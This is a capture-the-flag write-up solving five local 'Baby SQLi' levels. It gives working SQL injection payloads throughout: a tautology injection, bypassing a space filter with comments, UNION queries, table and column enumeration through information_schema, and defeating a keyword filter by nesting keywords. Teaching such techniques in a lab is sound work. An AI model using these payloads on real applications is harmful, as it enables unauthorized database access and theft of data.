# Baby SQLi (75 points)

Baby SQLi is meant to be an introductory challenge for SQL injections.
The goal was to teach about SQLi by encouraging participants
in doing the injections manually.

Some teams decided to try all of them with SQLmap, but soon enough
you'd end up having a hard time on Level 5 since filtering is involved.

With that being said, if you spend enough time googling,
you can find all of the solutions to these challenges online :D

Side note : I might have miscalculated the scoring on that one ;)
I was not expecting people to have such a hard time here, sorry
about that...

## Level 1

> http://localhost:16000/41633f246db7935ae490abcef7a72eb0.php?id=0

> This database has a bunch of secrets, but you need an ID to fetch them. Can you find a way to dump all the secrets?

Here we have to find a way to dump all the rows in a table without
knowing the IDs.

We can assume that the SQL query looks something like this :
```
SELECT *
FROM secrets
WHERE id = '[injection]'
```

In order to dump all the rows, our payload should be `' or 'x'='x`, resulting
in :

```
SELECT *
FROM secrets
WHERE id = '' or 'x'='x'
```

... which will be `true` for all rows since `'x'='x'` is always `true`.

> http://localhost:16000/41633f246db7935ae490abcef7a72eb0.php?id=%27%20or%20%27x%27=%27x

## Level 2

This level is essentially the same, but the webapp will give you an error message
if your payload uses spaces.

By googling `sql injection no spaces`, there are a bunch of articles available
on how to bypass this issue.

A popular one is to replace the spaces with `/**/`.

The solution to this challenge becomes `'/**/or/**/'x'='x`:

```
SELECT *
FROM secrets
WHERE id = ''/**/or/**/'x'='x'
```

## Level 3

This level is an introduction to `UNION` injections. Until now, the tokens
were stored in the same table as the one we're querying.

Level 3 requires us to fetch the contents of a `tokens` table despite the
fact that the webapp is querying a `recipes` table.

In the end, the final request needs to look like the following :

```
SELECT *
FROM recipes
WHERE recipe LIKE '%'
UNION SELECT *
FROM tokens
WHERE '%'='%'
```

The payload should be : `' UNION SELECT * FROM tokens WHERE '%'='`

## Level 4

This level presents the concept of metadata tables.

In level 3, the name of the table was given (`tokens`). In a real life
SQL injection, that information is rarely available.

So the challenge here is to figure out the name of the new table.

After a couple of google searches you'll find articles like [this one](https://websec.ca/kb/sql_injection#MySQL_Tables_And_Columns) detailing the existing of
`information_schema.tables`.

The `information_schema` database has a large collection of tables containing
metadata like a list of table names, column names, variables, etc. By querying
this table, we can figure out the name of our new token table.

The final request needs to look like the following :

```
SELECT *
FROM recipes
WHERE recipe LIKE '%'
UNION SELECT table_name, 0
FROM information_schema.tables
WHERE '%'='%'
```

The reason why we are using `table_name, 0` instead of just `table_name`
is because `UNION` statements require that both both tables have the same
number of columns. So we select the column we want, and add a dummy value
next to it.

TL;DR : You can't merge a 2 column table with a 9 column table.

Our final payload should be :
`' UNION SELECT table_name, 0 FROM information_schema.tables WHERE '%'='%`

One of the table names was the token.

## Level 5

> The final challenge.
> The token is once again hidden somewhere in the database. Also, a new defense mechanism has been added to prevent your evil injections.
> Good luck!

Finally, we're at level 5. This challenge was the only one you couldn't solve
with SQLmap natively.

This level is pretty much the same as the one before, but a new "defense
mechanism" has been added.

### Bypassing the filter

When we try the payload from the previous level, we get a warning message.
> Warning : Dangerous keywords have been removed.

Some keywords are removed when performing our query, let's figure out which
ones.

A simple way to do this is to take a valid query and add keywords to it.
If the query is still valid, we can assume that the webapp removed it.
If the query is not valid, the webapp didn't filter it.

For example :

`http://localhost:16000/edf65cdde5abaf16e4a7a5f378ee302c.php?str=a` will give us
all comic books with an `a` in it.

`http://localhost:16000/edf65cdde5abaf16e4a7a5f378ee302c.php?str=aUNION` will generate
a warning and **still** give us all the comic books with an `a` in it.

So we can assume that the webapp filtered the **UNION** out out.

Using this technique, 3 keywords are found to be filtered :
- UNION
- SELECT
- FROM

These keywords are essential for our SQL injection though... So we need to figure
out how to use these words despite the fact that they are removed.

Googling `sql injection filter bypass` will land you in articles like this one :
https://support.portswigger.net/customer/en/portal/articles/2590739-sql-injection-bypassing-common-filters- explaining the bypass.

The trick is to embed invalid keywords into other invalid ones.

The best way to explain this is with an example :

```
Given "ABC SELFROMECT ABC".

What happens if we remove all instances of "FROM"?

We end up with "ABC SELECT ABC".
```

By embedding invalid keywords, removing them forms new keywords.

Therefore, when doing SQL injections for this challenge, our new keywords are :
```
- UNION => UNIUNIONON
- SELECT => SELSELECTECT
- FROM => FRFROMOM
```

### Final payload
Let's use our payload from level 4 and update the keywords with our new bypass.
I'm using `table_name, column_name` to fetch both the tables and columns
at the same time.

```
' UNIUNIONON SELSELECTECT table_name, column_name FRFROMOM
information_schema.columns WHERE '%'='%
```

This will give us the following tables/columns :
```
mysterious_secret_table -> id
mysterious_secret_table -> 1337_leet_haxor_token_column
mysterious_secret_table -> some_useless_column
```

Lastly, we do a UNION injection to fetch the `1337_leet_haxor_token_column`
column and retrieve the last token.

```
a' UNIUNIONON SELESELECTCT id, 1337_leet_haxor_token_column FROFROMM mysterious_secret_table WHERE '%'='%
```

75 points might not have been enough here ^^"
Sorry!
